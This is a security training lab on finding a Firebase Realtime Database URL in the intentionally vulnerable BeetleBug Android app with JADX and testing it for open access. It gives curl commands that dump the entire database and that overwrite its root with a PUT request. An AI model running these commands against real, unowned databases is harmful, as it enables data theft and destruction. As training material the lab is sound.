# Firebase Realtime Database Security Analysis Lab

## Objective

Analyze an Android application to identify Firebase Realtime Database usage and test whether the database is publicly accessible for reading or writing without authentication.

---

# Prerequisites

- JADX GUI
- `curl`
- Internet connection
- BeetleBug vulnerable Android application (APK)

---

# Step 1: Download the BeetleBug APK

Repository:

```text
https://github.com/hafiz-ng/Beetlebug
```

Download the latest APK from the repository.

> **Note:** BeetleBug is an intentionally vulnerable Android application designed for Android security training and penetration testing practice.

---

# Step 2: Open the APK in JADX

Launch **JADX GUI**.

Open the downloaded APK.

Navigate to:

```text
Resources
└── .resources.arsc
    └── res
        └── values
            └── strings.xml
```

---

# Step 3: Locate Firebase Configuration

Open:

```text
strings.xml
```

Press:

```text
Ctrl + F
```

Search for:

```text
firebase
```

You should find Firebase-related configuration values such as:

- Firebase Database URL
- Firebase Project ID
- Firebase API Key
- Firebase App ID
- Other Firebase configuration strings

Example:

```text
https://beetlebug-374fc-default-rtdb.firebaseio.com
```

---

# Firebase Realtime Database Security Testing

Once the Firebase Database URL has been identified, test whether the database is publicly accessible.

---

# Step 4: Test Public Read Access

Execute:

```bash
curl -ks "https://beetlebug-374fc-default-rtdb.firebaseio.com/.json"
```

---

## Explanation

Appending:

```text
/.json
```

to a Firebase Realtime Database URL requests the entire database in JSON format.

If **public read access** is enabled, Firebase returns the stored data without requiring authentication.

---

## Possible Outcomes

### Publicly Readable

Example:

```json
{
    "users": {
        "admin": {
            "name": "Administrator"
        }
    }
}
```

This indicates the database allows unauthenticated read access.

---

### Secure Database

Example:

```json
{
    "error": "Permission denied"
}
```

This indicates read access is properly restricted.

---

# Step 5: Test Public Write Access

Execute:

```bash
curl -ks -X PUT \
"https://beetlebug-374fc-default-rtdb.firebaseio.com/.json" \
-d '{"key":"value","K2":"V2"}' \
-H "Content-Type: application/json" \
-i
```

Or as a single line:

```bash
curl -ks -X PUT "https://beetlebug-374fc-default-rtdb.firebaseio.com/.json" -d '{"key":"value","K2":"V2"}' -H "Content-Type: application/json" -i
```

---

## Explanation

This command attempts to overwrite the Firebase Realtime Database using an HTTP **PUT** request.

The request body contains:

```json
{
    "key": "value",
    "K2": "V2"
}
```

If the server accepts the request without requiring authentication, it indicates the database permits unauthorized write operations.

---

## Possible Outcomes

### Public Write Enabled

Example:

```http
HTTP/1.1 200 OK
```

This indicates that anyone on the Internet can modify the database.

⚠️ This is a **critical security vulnerability**.

---

### Write Access Denied

Example:

```json
{
    "error": "Permission denied"
}
```

This indicates write access is correctly restricted.

---

# Security Risks

If both read and write access are publicly available, an attacker could:

- Read sensitive application data
- Modify existing records
- Delete database contents
- Insert malicious data
- Corrupt application functionality
- Compromise user information

---

# Best Practices

To secure a Firebase Realtime Database:

- Require user authentication.
- Configure Firebase Security Rules correctly.
- Disable public read/write access.
- Apply the principle of least privilege.
- Regularly audit Firebase security rules.

---

# Commands Summary

## Test Read Access

```bash
curl -ks "https://beetlebug-374fc-default-rtdb.firebaseio.com/.json"
```

---

## Test Write Access

```bash
curl -ks -X PUT \
"https://beetlebug-374fc-default-rtdb.firebaseio.com/.json" \
-d '{"key":"value","K2":"V2"}' \
-H "Content-Type: application/json" \
-i
```

---

# Conclusion

In this lab, the BeetleBug Android application was analyzed using JADX to identify its Firebase configuration. The Firebase Realtime Database endpoint was then tested for unauthenticated read and write access using `curl`.

A database that allows public access without authentication represents a serious security misconfiguration and should be protected using appropriate Firebase Security Rules.
